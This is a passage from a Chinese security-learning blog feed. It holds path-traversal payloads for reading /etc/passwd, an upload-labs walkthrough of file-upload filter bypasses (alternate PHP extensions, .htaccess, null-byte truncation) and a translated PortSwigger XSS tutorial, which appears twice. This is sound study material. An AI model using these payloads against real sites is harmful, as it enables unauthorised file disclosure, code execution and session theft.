<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 相对路径遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绝对路径遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=/</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码遍历</span></span><br><span class="line"><span class="comment"># 单层相对</span></span><br><span class="line">filename=%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># 双层相对</span></span><br><span class="line">filename=%<span class="number">252</span>e%<span class="number">252</span>e%<span class="number">252</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># 双层相对</span></span><br><span class="line">filename=.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/.%%32%65/</span>.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 从预期基本文件夹开始</span></span><br><span class="line">filename=<span class="regexp">/var/</span>www<span class="regexp">/images/</span>...%<span class="number">2</span>f...%<span class="number">2</span>f...%<span class="number">2</span>fetc/passwd</span><br><span class="line"><span class="comment"># 空字节截断</span></span><br><span class="line">filename=...<span class="regexp">/.../</span>...<span class="regexp">/etc/</span>passwd%<span class="number">00</span>.png</span><br></pre></td></tr></table></figure>
<h2 id="入门">入门</h2>
<h2 id="进阶">进阶</h2>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【upload-lab靶场】文件上传</title>
    <url>/posts/c42c29bc/</url>
    <content><![CDATA[<p>OK，打这个靶场的目的首先是学习学习，其次是看看我目前的能力。那些简单的，几下就过的就直接省略写了，后边能学到东西的再详细写一下。</p>
<h2 id="Pass-01">Pass-01</h2>
<p>很简单，把php文件后缀改成jpg，在burpsuite再改回来就可以了。</p>
<h2 id="Pass-02">Pass-02</h2>
<p>跟上题一样</p>
<h2 id="Pass-03">Pass-03</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>后端黑名单机制，别改回php，改成php5。</p>
</li>
<li class="lvl-2">
<p>另外随机化了文件名称，访问的时候注意。</p>
</li>
<li class="lvl-2">
<p>难度上升的还挺快，后端php代码不执行，<s>上传配置文件</s></p>
</li>
<li class="lvl-2">
<p>后端自动添加随机化前缀，上传配置文件是不行的。</p>
</li>
</ul>
<p>这一关怎么回事，后边的都比这个容易，网上的跟我遇到的也不一样。先留着看看了。</p>
<h2 id="Pass-04">Pass-04</h2>
<p>这个是修改.htaccess文件</p>
<h2 id="Pass-05">Pass-05</h2>
<p>额…上传后缀jpg的php文件，访问直接执行php代码了。删了.htaccess文件重来。<br>
jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑名单防护。大小写绕过成功用于我docker镜像的系统是Linux所以不会执行，网上很多windows系统是直接执行的。</p>
<h2 id="Pass-06">Pass-06</h2>
<p>道理一样，jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑名单防护。做了一些尝试，最后<code>1.php .</code>上传成功。Linux无法访问</p>
<h2 id="Pass-07">Pass-07</h2>
<p>唉又是黑名单。上传<code>1.php.</code>直接上传了。Linux不执行</p>
<h2 id="Pass-08">Pass-08</h2>
<p>又是黑名单。<code>::$DATA</code>绕过，因为是linux依然不执行。</p>
<h2 id="Pass-09">Pass-09</h2>
<p>哎呀又是黑名单。<code>1.php. .</code>成功绕过，但是生成<code>1.php.</code>，Linux不执行</p>
<h2 id="Pass-10">Pass-10</h2>
<p>又是。黑名单删除，上传<code>1.pphphp</code>成功绕过，可执行</p>
<h2 id="Pass-11">Pass-11</h2>
<p>终于不是黑名单了。随机化文件名，只能传符合要求的后缀。网上说是%00截断。但是这里的php版本已经更新了？</p>
<p><img src="/posts/c42c29bc//image-20250514140155533.png" alt="image-20250514140155533"></p>
<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题；并且magic_quotes_gpc需要为OFF状</p>
<p><img src="/posts/c42c29bc//image-20250519105248225.png" alt="image-20250519105248225"></p>
<h2 id="Pass-12">Pass-12</h2>
<p>这关跟上提的差别就是把GET方法传的save_path改成了用POST方法传。要把%00截断符改成十六进制截断符。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>其他靶场</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>upload-lab靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】跨站脚本（XSS）</title>
    <url>/posts/cded1aa8/</url>
    <content><![CDATA[<h2 id="跨站脚本">跨站脚本</h2>
<h2 id="什么是跨站脚本-XSS-？">什么是跨站脚本 (XSS)？</h2>
<p>跨站脚本攻击（又称 XSS）是一种网络安全漏洞，它允许攻击者破坏用户与有漏洞的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同网站相互隔离。跨站脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，那么攻击者就可以完全控制应用程序的所有功能和数据。</p>
<h2 id="XSS-如何工作？">XSS 如何工作？</h2>
<p>跨站脚本攻击的原理是操纵有漏洞的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者就能完全破坏他们与应用程序的交互。</p>
<blockquote>
<p><strong>Labs</strong></p>
<p>如果您已经熟悉了 XSS 漏洞背后的基本概念，只是想在一些现实的、故意易受攻击的目标上练习利用这些漏洞，您可以通过下面的链接访问本主题中的所有实验室。</p>
<ul class="lvl-1">
<li class="lvl-2">
<p><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">View all XSS labs</a></p>
</li>
</ul>
</blockquote>
<h2 id="XSS-概念验证">XSS 概念验证</h2>
<p>您可以通过注入有效负载，使自己的浏览器执行一些任意 JavaScript 来确认大多数类型的 XSS 漏洞。使用 alert() 函数来实现这一目的早已成为惯例，因为它简短、无害，而且成功调用时很难被忽略。事实上，我们的大多数 XSS 实验都是在模拟受害者的浏览器中调用 alert() 来解决的。</p>
<p>不幸的是，如果您使用的是 Chrome 浏览器，就会遇到一点小麻烦。从版本 92 开始（2021 年 7 月 20 日），跨源 iframe 无法调用 alert()。由于这些框架用于构建一些更高级的 XSS 攻击，因此有时需要使用其他 PoC 有效负载。在这种情况下，我们推荐使用 print() 函数。如果您有兴趣了解有关这一变更的更多信息，以及我们为什么喜欢 print()，请查看我们有关这一主题的<a href="https://portswigger.net/research/alert-is-dead-long-live-print">博客</a>。</p>
<h2 id="XSS-攻击有哪些类型？">XSS 攻击有哪些类型？</h2>
<p>XSS 攻击主要有三种类型。它们是：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>反射 XSS：恶意脚本来自当前 HTTP 请求。</p>
</li>
<li class="lvl-2">
<p>存储型 XSS：恶意脚本来自网站数据库。</p>
</li>
<li class="lvl-2">
<p>基于 DOM 的 XSS，即漏洞存在于客户端代码而非服务器端代码中</p>
</li>
</ul>
<h2 id="反射式跨站脚本">反射式跨站脚本</h2>
<p>在本节中，我们将解释反射式跨站脚本，描述反射式 XSS 攻击的影响，并说明如何查找反射式 XSS 漏洞。</p>
<h3 id="什么是反射式跨站脚本？">什么是反射式跨站脚本？</h3>
<p>反射式 XSS 是跨站脚本攻击中最简单的一种。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将这些数据包含在即时响应中时，就会出现这种情况。</p>
<p>下面是一个反射 XSS 漏洞的简单示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=All+is+well.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: All is well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用程序不会对数据进行任何其他处理，因此攻击者可以构建类似的攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户访问了攻击者构建的 URL，那么攻击者的脚本就会在该用户与应用程序的会话上下文中，在用户的浏览器中执行。此时，脚本可以执行任何操作，并检索用户可以访问的任何数据。</p>
<p>当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会产生反射式跨站脚本攻击（或 XSS）。</p>
<p>假设一个网站有一个搜索功能，它在 URL 参数中接收用户提供的搜索词：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/search?term=gift</span></span><br></pre></td></tr></table></figure>
<p>应用程序会在对该 URL 的响应中呼应所提供的搜索词：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>假定应用程序不对数据进行任何其他处理，攻击者就可以构建这样的攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/search?term=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该 URL 会得到以下响应：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果应用程序的其他用户请求攻击者的 URL，那么攻击者提供的脚本就会在受害者用户的浏览器中，在其与应用程序的会话上下文中执行。</p>
<h3 id="Lab-将-XSS-反映到未编码的-HTML-上下文中">Lab: 将 XSS 反映到未编码的 HTML 上下文中</h3>
<p>直接在搜索框搜索 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 就通关了</p>
<h3 id="反射式-XSS-攻击的影响">反射式 XSS 攻击的影响</h3>
<p>如果攻击者可以控制受害者浏览器中执行的脚本，那么他们通常就可以完全控制该用户。其中，攻击者可以：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在应用程序内执行用户可以执行的任何操作。</p>
</li>
<li class="lvl-2">
<p>查看用户可以查看的任何信息。</p>
</li>
<li class="lvl-2">
<p>修改用户可以修改的任何信息。</p>
</li>
<li class="lvl-2">
<p>启动与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户。</p>
</li>
</ul>
<p>攻击者可以通过各种手段诱使受害用户发出受其控制的请求，从而实施反射 XSS 攻击。这些手段包括在攻击者控制的网站上或允许生成内容的其他网站上放置链接，或在电子邮件、推特或其他信息中发送链接。攻击可以直接针对已知用户，也可以是针对应用程序任何用户的无差别攻击。</p>
<p>攻击需要外部传递机制，这意味着反射 XSS 的影响通常不如存储 XSS 严重，因为存储 XSS 可以在易受攻击的应用程序内部传递自带的攻击。</p>
<h3 id="利用跨站点脚本漏洞">利用跨站点脚本漏洞</h3>
<p>证明发现跨站脚本漏洞的传统方法是使用 alert() 函数创建一个弹出窗口。这并不是因为 XSS 与弹出窗口有什么关系；这只是一种证明您可以在给定域上执行任意 JavaScript 的方法。您可能会注意到有些人使用 alert(document.domain)。这是一种明确说明 JavaScript 在哪个域上执行的方法。</p>
<p>有时，你会想更进一步，通过提供一个完整的漏洞利用来证明 XSS 漏洞是一个真正的威胁。在本节中，我们将探讨三种最常用、最强大的 XSS 漏洞利用方法。</p>
<h4 id="利用跨站脚本窃取-cookie">利用跨站脚本窃取 cookie</h4>
<p>窃取 cookie 是一种利用 XSS 的传统方法。大多数网络应用程序都使用 cookie 进行会话处理。您可以利用跨站脚本漏洞，将受害者的 cookie 发送到自己的域，然后手动将 cookie 注入浏览器并假冒受害者。</p>
<p>实际上，这种方法有很大的局限性：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>受害者可能没有登录。</p>
</li>
<li class="lvl-2">
<p>许多应用程序会使用 HttpOnly 标志对 JavaScript 隐藏 cookie。</p>
</li>
<li class="lvl-2">
<p>会话可能被其他因素锁定，如用户的 IP 地址。</p>
</li>
<li class="lvl-2">
<p>会话可能会在你劫持之前超时。</p>
</li>
</ul>
<h4 id="Lab：-利用跨站脚本窃取-cookie">Lab： 利用跨站脚本窃取 cookie</h4>
<p>本实验室包含博客评论功能中的存储 XSS 漏洞。模拟受害者用户会查看发布后的所有评论。要解决该实验问题，利用该漏洞渗出受害者的会话 cookie，然后使用该 cookie 冒充受害者。</p>
<h3 id="不同情况下的反射-XSS">不同情况下的反射 XSS</h3>
<h2 id="存储型XSS">存储型XSS</h2>
<p>当应用程序从不受信任的来源接收数据，并以不安全的方式将这些数据包含在随后的 HTTP 响应中时，就会产生存储 XSS（也称为持久或二阶 XSS）。</p>
<p>有关数据可能是通过 HTTP 请求提交给应用程序的；例如，博客文章上的评论、聊天室中的用户昵称或客户订单上的详细联系信息。在其他情况下，数据可能来自其他不受信任的来源；例如，显示通过 SMTP 收到的邮件的网络邮件应用程序、显示社交媒体帖子的营销应用程序或显示网络流量数据包的网络监控应用程序。</p>
<p>下面是一个存储 XSS 漏洞的简单示例。一个留言板应用程序允许用户提交信息，并显示给其他用户：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, this is my message!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用程序不会对数据进行任何其他处理，因此攻击者可以轻松发送攻击其他用户的信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="基于-DOM-的跨站点脚本">基于 DOM 的跨站点脚本</h2>
<p>基于 DOM 的 XSS（也称 DOM XSS）是指应用程序包含一些客户端 JavaScript，这些 JavaScript 以不安全的方式处理来自不信任源的数据，通常是将数据写回 DOM。</p>
<p>在下面的示例中，应用程序使用 JavaScript 从输入字段读取值，并将该值写入 HTML 中的一个元素：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span><br><span class="line">results.<span class="property">innerHTML</span> = <span class="string">&#x27;You searched for: &#x27;</span> + search;</span><br></pre></td></tr></table></figure>
<p>如果攻击者可以控制输入字段的值，他们就可以轻松构建一个恶意值，从而执行自己的脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">You</span> searched <span class="attr">for</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;/* Bad stuff here... */&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>在典型的情况下，输入字段将由 HTTP 请求的一部分填充，如 URL 查询字符串参数，从而允许攻击者使用恶意 URL 进行攻击，其方式与反射 XSS 相同。</p>
<h2 id="XSS-可以用来做什么？">XSS 可以用来做什么？</h2>
<p>利用跨站脚本漏洞的攻击者通常能够：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>冒充或伪装成受害用户。</p>
</li>
<li class="lvl-2">
<p>执行用户能够执行的任何操作。</p>
</li>
<li class="lvl-2">
<p>读取用户能够访问的任何数据。</p>
</li>
<li class="lvl-2">
<p>获取用户的登录凭证。</p>
</li>
<li class="lvl-2">
<p>对网站进行虚拟篡改。</p>
</li>
<li class="lvl-2">
<p>在网站中注入木马功能。</p>
</li>
</ul>
<h2 id="XSS-漏洞的影响">XSS 漏洞的影响</h2>
<p>XSS 攻击的实际影响通常取决于应用程序的性质、功能和数据，以及被攻击用户的状态。例如：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在小册子软件应用程序中，所有用户都是匿名的，所有信息都是公开的，因此影响通常很小。</p>
</li>
<li class="lvl-2">
<p>在持有敏感数据（如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。</p>
</li>
<li class="lvl-2">
<p>如果被入侵的用户在应用程序中拥有更高的权限，那么影响通常会非常严重，攻击者可以完全控制存在漏洞的应用程序，并入侵所有用户及其数据。</p>
</li>
</ul>
<h2 id="如何查找和测试-XSS-漏洞">如何查找和测试 XSS 漏洞</h2>
<p>绝大多数 XSS 漏洞都可以通过 Burp Suite 的网络漏洞扫描仪快速、可靠地发现。</p>
<p>手动测试反射和存储的 XSS 通常涉及向应用程序中的每个入口点提交一些简单的唯一输入（如一个简短的字母数字字符串），识别在 HTTP 响应中返回所提交输入的每个位置，并对每个位置进行单独测试，以确定适当制作的输入是否可用于执行任意 JavaScript。通过这种方法，您可以确定发生 XSS 的上下文，并选择合适的有效载荷加以利用。</p>
<p>手动测试由 URL 参数引起的基于 DOM 的 XSS 涉及类似的过程：在参数中放置一些简单的唯一输入，使用浏览器的开发工具在 DOM 中搜索该输入，并测试每个位置以确定其是否可被利用。然而，其他类型的 DOM XSS 更难检测。要在非基于 URL 的输入（如 document.cookie）或非基于 HTML 的汇（如 setTimeout）中发现基于 DOM 的漏洞，审查 JavaScript 代码是不可替代的，而审查 JavaScript 代码可能非常耗时。Burp Suite 的网络漏洞扫描器结合了 JavaScript 的静态和动态分析，能够可靠地自动检测基于 DOM 的漏洞。</p>
<h2 id="内容安全政策">内容安全政策</h2>
<p>内容安全策略（CSP）是一种浏览器机制，旨在减轻跨站脚本和其他一些漏洞的影响。如果采用 CSP 的应用程序包含类似 XSS 的行为，那么 CSP 可能会阻碍或阻止对漏洞的利用。通常情况下，CSP 可被规避，以便利用底层漏洞。</p>
<h2 id="悬挂标记注入">悬挂标记注入</h2>
<p>悬垂标记注入是一种技术，可用于在由于输入过滤器或其他防御措施而无法进行全面跨站脚本攻击的情况下跨域捕获数据。这种技术通常可用于捕获其他用户可见的敏感信息，包括可用于代表用户执行未授权操作的 CSRF 标记。</p>
<h2 id="如何防止-XSS-攻击">如何防止 XSS 攻击</h2>
<p>在某些情况下，防止跨站脚本是一件小事，但根据应用程序的复杂程度和处理用户可控数据的方式，防止跨站脚本可能要难得多。</p>
<p>一般来说，有效防止 XSS 漏洞可能需要结合以下措施：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在输入到达时进行过滤。在接收用户输入时，尽可能严格地根据预期或有效输入进行过滤。</p>
</li>
<li class="lvl-2">
<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
</li>
<li class="lvl-2">
<p>使用适当的响应标头。为防止在不打算包含任何 HTML 或 JavaScript 的 HTTP 响应中出现 XSS，可以使用 <code>Content-Type</code> 和 <code>X-Content-Type-Options</code> 标头，确保浏览器按您的意图解释响应。</p>
</li>
<li class="lvl-2">
<p>内容安全策略。作为最后一道防线，你可以使用内容安全策略（CSP）来降低仍然存在的任何 XSS 漏洞的严重性。</p>
</li>
</ul>
<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
<h2 id="有关跨站脚本的常见问题">有关跨站脚本的常见问题</h2>
<p>XSS 漏洞有多常见？XSS 漏洞非常常见，XSS 可能是最常出现的网络安全漏洞。</p>
<p>XSS 攻击有多常见？很难获得有关真实世界中 XSS 攻击的可靠数据，但它被利用的频率可能低于其他漏洞。</p>
<p>XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱使受害用户执行他们无意执行的操作。</p>
<p>XSS 与 SQL 注入有何区别？XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞。</p>
<p>如何在 PHP 中防止 XSS？使用允许字符的白名单过滤输入，并使用类型提示或类型转换。在 HTML 上下文中使用 <code>htmlentities</code> 和 <code>ENT_QUOTES</code> 对输出进行转义，在 JavaScript 上下文中使用 JavaScript Unicode 转义。</p>
<p>如何在 Java 中防止 XSS？使用允许字符白名单过滤输入，使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或使用 JavaScript Unicode 转义对 JavaScript 上下文进行转义。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】跨站脚本（XSS）</title>
    <url>/posts/cded1aa8/</url>
    <content><![CDATA[<h2 id="跨站脚本">跨站脚本</h2>
<h2 id="什么是跨站脚本-XSS-？">什么是跨站脚本 (XSS)？</h2>
<p>跨站脚本攻击（又称 XSS）是一种网络安全漏洞，它允许攻击者破坏用户与有漏洞的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同网站相互隔离。跨站脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，那么攻击者就可以完全控制应用程序的所有功能和数据。</p>
<h2 id="XSS-如何工作？">XSS 如何工作？</h2>
<p>跨站脚本攻击的原理是操纵有漏洞的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者就能完全破坏他们与应用程序的交互。</p>
<blockquote>
<p><strong>Labs</strong></p>
<p>如果您已经熟悉了 XSS 漏洞背后的基本概念，只是想在一些现实的、故意易受攻击的目标上练习利用这些漏洞，您可以通过下面的链接访问本主题中的所有实验室。</p>
<ul class="lvl-1">
<li class="lvl-2">
<p><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">View all XSS labs</a></p>
</li>
</ul>
</blockquote>
<h2 id="XSS-概念验证">XSS 概念验证</h2>
<p>您可以通过注入有效负载，使自己的浏览器执行一些任意 JavaScript 来确认大多数类型的 XSS 漏洞。使用 alert() 函数来实现这一目的早已成为惯例，因为它简短、无害，而且成功调用时很难被忽略。事实上，我们的大多数 XSS 实验都是在模拟受害者的浏览器中调用 alert() 来解决的。</p>
<p>不幸的是，如果您使用的是 Chrome 浏览器，就会遇到一点小麻烦。从版本 92 开始（2021 年 7 月 20 日），跨源 iframe 无法调用 alert()。由于这些框架用于构建一些更高级的 XSS 攻击，因此有时需要使用其他 PoC 有效负载。在这种情况下，我们推荐使用 print() 函数。如果您有兴趣了解有关这一变更的更多信息，以及我们为什么喜欢 print()，请查看我们有关这一主题的<a href="https://portswigger.net/research/alert-is-dead-long-live-print">博客</a>。</p>
<h2 id="XSS-攻击有哪些类型？">XSS 攻击有哪些类型？</h2>
<p>XSS 攻击主要有三种类型。它们是：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>反射 XSS：恶意脚本来自当前 HTTP 请求。</p>
</li>
<li class="lvl-2">
<p>存储型 XSS：恶意脚本来自网站数据库。</p>
</li>
<li class="lvl-2">
<p>基于 DOM 的 XSS，即漏洞存在于客户端代码而非服务器端代码中</p>
</li>
</ul>
<h2 id="反射式跨站脚本">反射式跨站脚本</h2>
<p>在本节中，我们将解释反射式跨站脚本，描述反射式 XSS 攻击的影响，并说明如何查找反射式 XSS 漏洞。</p>
<h3 id="什么是反射式跨站脚本？">什么是反射式跨站脚本？</h3>
<p>反射式 XSS 是跨站脚本攻击中最简单的一种。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将这些数据包含在即时响应中时，就会出现这种情况。</p>
<p>下面是一个反射 XSS 漏洞的简单示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=All+is+well.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: All is well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用程序不会对数据进行任何其他处理，因此攻击者可以构建类似的攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/status?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户访问了攻击者构建的 URL，那么攻击者的脚本就会在该用户与应用程序的会话上下文中，在用户的浏览器中执行。此时，脚本可以执行任何操作，并检索用户可以访问的任何数据。</p>
<p>当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会产生反射式跨站脚本攻击（或 XSS）。</p>
<p>假设一个网站有一个搜索功能，它在 URL 参数中接收用户提供的搜索词：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/search?term=gift</span></span><br></pre></td></tr></table></figure>
<p>应用程序会在对该 URL 的响应中呼应所提供的搜索词：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>假定应用程序不对数据进行任何其他处理，攻击者就可以构建这样的攻击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://insecure-website.com/search?term=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该 URL 会得到以下响应：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果应用程序的其他用户请求攻击者的 URL，那么攻击者提供的脚本就会在受害者用户的浏览器中，在其与应用程序的会话上下文中执行。</p>
<h3 id="Lab-将-XSS-反映到未编码的-HTML-上下文中">Lab: 将 XSS 反映到未编码的 HTML 上下文中</h3>
<p>直接在搜索框搜索 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 就通关了</p>
<h3 id="反射式-XSS-攻击的影响">反射式 XSS 攻击的影响</h3>
<p>如果攻击者可以控制受害者浏览器中执行的脚本，那么他们通常就可以完全控制该用户。其中，攻击者可以：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在应用程序内执行用户可以执行的任何操作。</p>
</li>
<li class="lvl-2">
<p>查看用户可以查看的任何信息。</p>
</li>
<li class="lvl-2">
<p>修改用户可以修改的任何信息。</p>
</li>
<li class="lvl-2">
<p>启动与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户。</p>
</li>
</ul>
<p>攻击者可以通过各种手段诱使受害用户发出受其控制的请求，从而实施反射 XSS 攻击。这些手段包括在攻击者控制的网站上或允许生成内容的其他网站上放置链接，或在电子邮件、推特或其他信息中发送链接。攻击可以直接针对已知用户，也可以是针对应用程序任何用户的无差别攻击。</p>
<p>攻击需要外部传递机制，这意味着反射 XSS 的影响通常不如存储 XSS 严重，因为存储 XSS 可以在易受攻击的应用程序内部传递自带的攻击。</p>
